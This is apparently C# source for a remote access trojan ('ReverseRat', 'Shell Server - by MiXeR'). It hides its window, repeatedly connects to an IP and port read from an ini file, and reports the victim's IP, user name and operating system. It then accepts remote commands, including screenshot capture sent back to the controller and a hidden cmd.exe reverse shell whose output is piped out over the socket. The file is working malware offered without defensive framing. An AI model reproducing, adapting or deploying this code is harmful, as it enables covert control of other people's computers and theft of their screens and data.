//
//  Shell Server - by MiXeR


using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Windows.Forms;


namespace ReverseRat
{

   
    public partial class FrmDummy : Form
    {
        TcpClient _tcpClient;
        NetworkStream _networkStream;
        StreamWriter _streamWriter;
        StreamReader _streamReader;
        Process _processCmd;
        StringBuilder _strInput;
        Funciones Utilidades = new Funciones();
        string _mutexApp, _ipConexion,_puertoConexion;
        private bool _shell;

        public FrmDummy()
        {
            bool createdNew;

            _mutexApp = Utilidades.RandomString(10);  // Mutex de la aplicacion        
            Mutex m = new Mutex( true, _mutexApp, out createdNew );       
               
            if( !createdNew )
            {
                // Instance already running; exit.
                MessageBox.Show(@"Exiting: Instance already running" );
                Environment.Exit(0);
            }
            m.Close();
            InitializeComponent();
        }

        private void Form1_Shown(object sender, EventArgs e)
        {
            Hide();
            for (;;)
            {               
                RunServer();
                Thread.Sleep(2000); //Wait 2 seconds
            }                                        //then try again
            // ReSharper disable once FunctionNeverReturns
        }

     
        private void RunServer()
        {
            _tcpClient = new TcpClient();
            _strInput = new StringBuilder();
     
            if (!_tcpClient.Connected)
            {
                try
                {                   
                    _tcpClient.Connect(_ipConexion, Convert.ToInt32(_puertoConexion));
                    _networkStream = _tcpClient.GetStream();
                    _streamReader = new StreamReader(_networkStream);
                    _streamWriter = new StreamWriter(_networkStream);
                    EnviaDatos("M1X3R|" + Utilidades.ObtenerIp() + "|" + Utilidades.ObtenPcUser() + "|" + Utilidades.TipoSistemaOperativo() + "|" + _mutexApp);
                }
                catch (Exception err)  // No hay cliente, regresa
                { 
                    Console.WriteLine(err.Message);
                    return; 
                }
                
             
            }

            while (true)
            {
                try // Parser de comandos
                {
                    _strInput.Append(_streamReader.ReadLine());
                    _strInput.Append("\r\n");

                    if (EncuentraComando("<:terminar:>"))
                    {
                        Detener(); // Cierra servidor
                    }
                    if (EncuentraComando("<:reiniciar:>"))
                    {
                        Cleanup(); // Cleanup para reiniciar Server
                    }
                    if (EncuentraComando("exit")) 
                    {
                        _shell = false;   // DOS Exit               
                    }                                    
                    if (EncuentraComando("<:hola:>"))
                    {
                        Utilidades.Hola();  // MessageBox de ejemplo
                    }
                    if (EncuentraComando("<:prueba:>"))
                    {
                        EnviaDatos("PRUEBA DE ENVIO DE DATOS" + "|" +  Funciones.HashServer + "|"); // Prueba
                    }
                    if (EncuentraComando("<:captura:>")) // Captura de screenshot
                    {  
                        EnviaDatos("<:imagen:>" + Utilidades.CapturarPantalla() + "<:imagen:>" + Funciones.HashServer + "<:imagen:>");
                    }
                    if (EncuentraComando("<:asignahash:>"))
                    {
                        Utilidades.AgregaHash(_strInput.ToString().Split(' ')[1].Trim()); // Comando asignarhash
                    }                                           
                    if (EncuentraComando("<:shell:>")) // Shell para DOS
                    {
                        _shell = true;
                        _processCmd = new Process();
                        _processCmd.StartInfo.FileName = "cmd.exe";
                        _processCmd.StartInfo.CreateNoWindow = true;
                        _processCmd.StartInfo.UseShellExecute = false;
                        _processCmd.StartInfo.RedirectStandardOutput = true;
                        _processCmd.StartInfo.RedirectStandardInput = true;
                        _processCmd.StartInfo.RedirectStandardError = true;
                        _processCmd.OutputDataReceived += CmdOutputDataHandler;
                        _processCmd.Start();
                        _processCmd.BeginOutputReadLine();                       
                    }
                     
                    if (_shell)
                    {                    
                        _processCmd.StandardInput.WriteLine(_strInput);                       
                    }
                   // MessageBox.Show(strInput.ToString());
                    _strInput.Remove(0, _strInput.Length);
                }
                catch (Exception err)
                {
                    Console.WriteLine(err.Message);
                    Cleanup();
                    break;
                }
            }            
        }

        bool EncuentraComando( string comando)
        {
            return _strInput.ToString().ToLower().LastIndexOf(comando, StringComparison.Ordinal) >= 0;
        }


        private void Cleanup()
        {
            try
            {
                _processCmd.Kill();
            }
            catch (Exception err)
            {
                Console.WriteLine(err.Message);
            }
            _streamReader.Close();
            _streamWriter.Close(); 
            _networkStream.Close();
        }

        private void Detener() // Comando para salir del servidor (cerrar aplicación)
        {
            Cleanup();
            Environment.Exit(Environment.ExitCode);
        }

        private void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();
            if (!string.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data + "|" + Funciones.HashServer + "|");
                    _streamWriter.WriteLine(strOutput);
                    _streamWriter.Flush();
                }
                catch (Exception err)
                {
                    Console.WriteLine(err.Message);
                }
            }
        }

        private void EnviaDatos(string cadena)
        {
            _streamWriter.WriteLine(cadena);
            _streamWriter.Flush();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            // Cargar opciones de Ini
            var myIni = new IniFile("opciones.ini");
            _ipConexion= myIni.Read("DefaultIP","opciones");
            _puertoConexion = myIni.Read("DefaultPort", "opciones");
            //MessageBox.Show(defaultVolume);
        }
    }
}